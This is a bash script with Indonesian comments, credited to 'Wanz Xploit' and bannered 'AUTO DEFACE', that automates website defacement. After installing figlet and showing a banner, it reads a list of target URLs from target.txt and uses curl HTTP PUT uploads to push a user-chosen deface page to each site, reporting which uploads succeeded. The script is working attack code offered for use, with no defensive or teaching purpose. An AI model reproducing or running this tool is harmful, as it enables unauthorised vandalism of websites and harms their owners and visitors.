#!/bin/bash
#Gunakan dengan bijak!
#Coded by Wanz Xploit
#recode boleh tapi jangan ubah nama pembuat kode nya!!
#kalo record jangan asal ciplak
#ubah tampilan nya juga biar ga asal copy paste

# Cek apakah figlet sudah terinstall, jika belum maka install figlet
if ! command -v figlet &> /dev/null; then
  echo -e "\e[31mFiglet belum terinstall, menginstall figlet ...\e[0m"
  echo ""
  if [[ "$(uname -s)" == "Linux" ]]; then
    sudo apt update
    sudo apt install figlet -y
  elif [[ "$(uname -s)" == "Android" ]]; then
    pkg update
    pkg install figlet -y
  fi
  echo ""
fi

# Minta akses ke storage di Android
if [[ "$(uname -s)" == "Android" ]]; then
  termux-setup-storage
fi

# Output tampilan awal
echo -e "\e[33m"
figlet -f standard "AUTO DEFACE"
echo -e "\e[32m"
echo "=============================="
echo "     Code By Wanz Xploit"
echo "          Open source"
echo "=============================="
echo ""

# Pindahkan file index.html ke sdcard atau penyimpanan internal
if [[ "$(uname -s)" == "Linux" ]]; then
  sudo cp index.html /mnt/sdcard/
elif [[ "$(uname -s)" == "Android" ]]; then
  cp index.html ~/storage/shared/
fi

# Masukkan nama file yang akan diupload
read -p "Masukkan nama Sc deface kalian: " filename
echo ""

# Cek apakah file yang dimaksud ada atau tidak
if [ -f "/sdcard/$filename" ]; then
  echo -e "\e[33mDeface menggunakan file $filename ...\e[0m"
  echo ""
  echo "============================"
  # Baca file target.txt dan upload file dengan curl
  while IFS= read -r url; do
    echo "Deface to: $url"
    result=$(curl -s -T "/sdcard/$filename" "$url" --max-time 10 --write-out "%{http_code}\n" -o /dev/null)
    if [ $result -eq 201 ] || [ $result -eq 204 ] || [ $result -eq 200 ]; then
      echo -e "\e[32mDeface berhasil ke $url\e[0m"
      echo ""
    else
      echo -e "\e[31mDeface gagal ke $url\e[0m"
      echo ""
    fi
  done < target.txt
else
  echo -e "\e[31mFile tidak ditemukan!\e[0m"
fi
